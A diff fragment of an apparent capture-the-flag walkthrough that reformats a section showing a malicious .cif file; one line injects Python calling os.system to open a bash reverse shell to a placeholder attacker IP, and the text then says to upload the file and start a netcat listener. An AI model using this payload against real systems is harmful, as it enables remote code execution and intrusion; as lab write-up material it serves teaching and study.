@@ -34,8 +34,8 @@ From the code that we found in this github link; we can use this to insert it in
 3. `"__builtins__.__import__('os').system('/bin/bash -c \"sh -i >& /dev/tcp/youripaddress/portlisternernumber 0>&1\"')"` 
 
 THE FINAL .cif WILL LOOK LIKE THIS
-
-`data_Example
+```
+data_Example
 _cell_length_a    10.00000
 _cell_length_b    10.00000
 _cell_length_c    10.00000
@@ -57,8 +57,7 @@ loop_
 
 _space_group_magn.number_BNS  62.448
 _space_group_magn.name_BNS  "P  n'  m  a'  "
-
-`
+```
 
 Once all this is done we can go ahead an upload our .cif file.
 Start a Netcat listener (make sure the port number is all the same) `nc -lvnp 7777`.
